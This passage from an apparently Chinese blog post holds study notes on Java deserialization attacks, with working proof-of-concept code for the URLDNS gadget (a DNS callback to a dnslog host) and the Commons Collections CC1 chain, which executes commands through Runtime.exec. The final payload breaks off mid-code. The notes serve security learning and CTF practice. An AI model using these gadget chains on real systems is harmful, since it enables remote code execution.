class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code>。</p>
<p>即进行了DNS查询。</p>
<p>做做ctfshow的DNSURL题目。</p>
<p>这是网上的POC，我们根据代码看看我们需要分析些什么：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://xkesxe.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要注意的是URL实例u的hashcode不是-1，而是经过计算成为其他的值了。</p>
<p>所以要进行修改，而hashcode为private，所以需要code.setAccessible(true);</p>
<p><a href="https://cloud.tencent.com/developer/article/1015078">深入理解 Java 反射：Field （成员变量） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">CTF&#x2F;Java-序列化和反序列化-学习笔记.md at main · bfengj&#x2F;CTF (github.com)</a></p>
<p>Field来自java.lang.reflect.Field，很明显其跟反射有关。具体看上面链接。</p>
<p>下面是chatgPT问的一个base64序列化类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Serializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; String <span class="title function_">serializeToBase64</span><span class="params">(T object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; T <span class="title function_">deserializeFromBase64</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">object</span> <span class="operator">=</span> (T) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是main</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialized Base64 string: &quot;</span> + base64String);</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> Base64Serializer.deserializeFromBase64(base64String);</span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized Person object: &quot;</span> + deserializedPerson);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="简化的CC1链子"><a href="#简化的CC1链子" class="headerlink" title="简化的CC1链子"></a>简化的CC1链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                                &#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现能够运行，接kan下来我们需要理解其为什么能运行（看类的源码）、以及找条会调用readObject的类（之后再说）。</p>
<p>下面分析一下设计到的接口和类：</p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><strong>TransformedMap</strong></h4><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。</p>
<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 列化能执⾏任意代码的关键。 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"> <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊.</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line"> object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么执行put就会调用而且输入还是随便的呢？"><a href="#为什么执行put就会调用而且输入还是随便的呢？" class="headerlink" title="为什么执行put就会调用而且输入还是随便的呢？"></a>为什么执行put就会调用而且输入还是随便的呢？</h4><p>debug看一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230402110648800.png" alt="image-20230402110648800"></p>
<p>堆栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transformValue:173, TransformedMap (org.apache.commons.collections.map) ()</span><br><span class="line">put:220, TransformedMap (org.apache.commons.collections.map) (          return valueTransformer.transform(object);      value = transformValue(value);)</span><br><span class="line">main:23, CommonCollections1 (org.example) (outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);)</span><br></pre></td></tr></table></figure>

<p>先回调用一个ConstantTransformer得到了我们的Runtime，然后之后在下一个transfmer里面执行invoke，over。</p>
<h3 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1"></a>CC1</h3><h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
<p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject 方法(这是8u71以前的代码，8u71以后做了一些修改)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            objectToString(value))</span><br><span class="line">                    .setMember(annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mv.put(name, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑就是 <strong>Map.Entry memberValue : memberValues.entrySet() 和 memberValue.setValue(…) 。</strong></p>
<p>memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它 的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。</p>
<p>我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的 HashMap设置进来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>这里因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类，不能直接使 用new来实例化。我使用<strong>反射</strong>获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化 了。 AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是 参数就是前面构造的Map。</p>
<p>太多了，懒得写了，直接上payload</p>
<p>这用的是另外一条cc1，没用代理。。。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//完整的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;), &#125;;</span><br><span class="line">        <span class="comment">//ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修饰map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        